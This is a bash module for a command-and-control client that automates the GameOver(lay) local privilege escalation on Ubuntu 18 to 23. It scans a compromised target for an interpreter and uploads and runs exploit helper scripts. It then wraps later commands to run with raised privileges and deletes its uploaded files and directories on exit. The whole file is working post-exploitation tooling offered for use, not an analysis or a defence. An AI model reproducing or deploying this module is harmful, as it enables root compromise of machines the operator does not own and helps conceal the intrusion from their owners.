#!/usr/bin/env bash
#c2-client module
#RiMyJcVwtt
#gameover
#depends on transfer module

source funcmgr.sh

# Global variable to track if gameover module is active
GAMEOVER_ACTIVE=0
# Print warning message in yellow
print_warn() {
  echo -e "${YELLOW}[!]${NC} $1" >&2
}

# Print error message in red
print_err() {
  echo -e "${RED}[!]${NC} $1" >&2
}

# Print standard message in green
print_std() {
  echo -e "${GREEN}[+]${NC} $1"
}

# Print help message with blue command and normal description
print_help() {
  echo -e "${BLUE}$1${NC} $2"
}

# Print output message with green prefix and yellow content
print_out() {
  echo -e "${GREEN}[+]${YELLOW} $1${NC}"
}

# Module initialization function
RiMyJcVwtt_init() {
  # Register module functions with the function manager
  register_function "enable_gameover" "enable_gameover" 0 "Setup gameover(lay) LPE command wrapper"
  register_function "disable_gameover" "disable_gameover" 0 "Disable gameover(lay) LPE command wrapper"
  # Register exit function to clean up on exit
  register_exit_func "disable_gameover_exit"
}

# Module main function (placeholder)
RiMyJcVwtt_main() {
  :
}

# Module description
RiMyJcVwtt_description() {
  echo "Gameover(lay) LPE command wrapper module"
}

# Module help function
RiMyJcVwtt_help() {
  print_help "enable_gameover" "enable gameover(lay) LPE command wrapper. Suitable for Ubuntu 18 to 23"
  print_help "disable_gameover" "disable gameover(lay) LPE command wrapper and clean up"
}

scan_system() {
  local interpreters=("python3" "python" "perl" "ruby" "php")
  GO_HELPER="none"
  print_std "Scanning target system..."
  for interp in "${interpreters[@]}"; do
    if send_cmd "command -v $interp >/dev/null 2>&1"; then
      GO_HELPER="$interp"
      print_std "Found suitable interpreter: $GO_HELPER"
      return 0
    fi
  done

  print_warn "No suitable interpreters found on target system."
  return 1
}

# Wrapper function for gameover commands
gameover_wrapper() {
  echo "$GO_WRAPPER_CMD $*"
}

# Enable the gameover module
enable_gameover() {

  # Check if already active
  if [[ $GAMEOVER_ACTIVE -eq 1 ]]; then
    print_warn "Gameover(lay) is already enabled."
    return 1
  fi

  print_std "Setting up gameover(lay)..."
  scan_system
  if [[ $GO_HELPER == "none" ]]; then
    print_warn "Aborting setup..."
    return 1
  fi
  case "$GO_HELPER" in
    python3)
      GO_WRAPPER_CMD="./gameover_wrapper.sh"
      GO_WRAPPER="gameover_wrapper.sh"
      ;;
    python)
      GO_WRAPPER_CMD="./gameover_wrapper2.sh"
      GO_WRAPPER="gameover_wrapper2.sh"
      ;;
    php)
      GO_WRAPPER_CMD="u/php gameover_wrapper.php"
      GO_WRAPPER="gameover_wrapper.php"
      ;;
    perl)
      GO_WRAPPER_CMD="u/perl gameover_wrapper.pl"
      GO_WRAPPER="gameover_wrapper.pl"
      ;;
    ruby)
      GO_WRAPPER_CMD="u/ruby gameover_wrapper.rb"
      GO_WRAPPER="gameover_wrapper.rb"
      ;;
  esac
  # Upload necessary helper scripts
  emergency_upload "./helpers/gameover.sh"
  emergency_upload "./helpers/$GO_WRAPPER"
  # Make scripts executable
  send_cmd "chmod +x gameover.sh"
  send_cmd "chmod +x $GO_WRAPPER"
  # Execute the main gameover script
  send_cmd "./gameover.sh $GO_HELPER"
  # Register command wrapper for gameover functionality
  register_cmd_wrapper "gameover_wrapper"
  # Set active flag
  GAMEOVER_ACTIVE=1
  print_std "Setup completed"
}

# Disable the gameover module
disable_gameover() {
  # Check if actually active
  if [[ $GAMEOVER_ACTIVE -eq 0 ]]; then
    print_warn "Cannot disable gameover(lay) because it is not active."
    return 1
  fi
  print_std "Disabling gameover(lay)..."
  # Unregister command wrapper
  unregister_cmd_wrapper "gameover_wrapper"
  print_std "Cleaning up..."
  # Remove uploaded scripts
  send_cmd "rm gameover.sh $GO_WRAPPER"
  # Remove any created directories
  send_cmd "rm -rf l m u w"
  # Reset active flag
  GAMEOVER_ACTIVE=0
  print_std "Done"
}

# Exit cleanup function (called automatically on exit)
disable_gameover_exit() {
  # Only clean up if active
  if [[ $GAMEOVER_ACTIVE -eq 1 ]]; then
    disable_gameover
  fi
}
